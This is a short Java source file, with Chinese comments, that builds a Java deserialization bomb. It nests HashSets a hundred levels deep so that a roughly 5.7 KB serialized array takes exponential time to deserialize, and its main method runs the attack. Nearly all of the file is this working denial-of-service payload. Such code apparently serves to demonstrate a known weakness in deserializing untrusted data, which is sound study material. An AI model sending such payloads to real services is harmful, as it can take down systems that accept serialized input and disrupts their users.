package com.cc11001100.bomb;

import java.io.*;
import java.util.HashSet;
import java.util.Set;

public class BombMain {

    /**
     * 把对象序列华为字节数组
     *
     * @param o
     * @return
     */
    public static byte[] serialize(Object o) {
        ByteArrayOutputStream ba = new ByteArrayOutputStream();
        try {
            new ObjectOutputStream(ba).writeObject(o);
        } catch (IOException e) {
            throw new IllegalArgumentException(e);
        }
        return ba.toByteArray();
    }

    /**
     * 从字节数组反序列化出来对象
     *
     * @param bytes
     * @return
     */
    public static Object deserialize(byte[] bytes) {
        try {
            return new ObjectInputStream(
                    new ByteArrayInputStream(bytes)).readObject();
        } catch (IOException | ClassNotFoundException e) {
            throw new IllegalArgumentException(e);
        }
    }

    /**
     * 构造会造成拒绝服务的序列化数组
     *
     * @return
     */
    static byte[] bomb() {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {

            Set<Object> t1 = new HashSet<>();
            t1.add("foo"); // make it not equal to t2
            s1.add(t1);
            s2.add(t1);

            Set<Object> t2 = new HashSet<>();
            s1.add(t2);
            s2.add(t2);

            s1 = t1;
            s2 = t2;
        }
        return serialize(root);
    }

    public static void main(String[] args) throws Exception {
        System.out.println(bomb().length); // Output: 5744
        deserialize(bomb());
    }

}
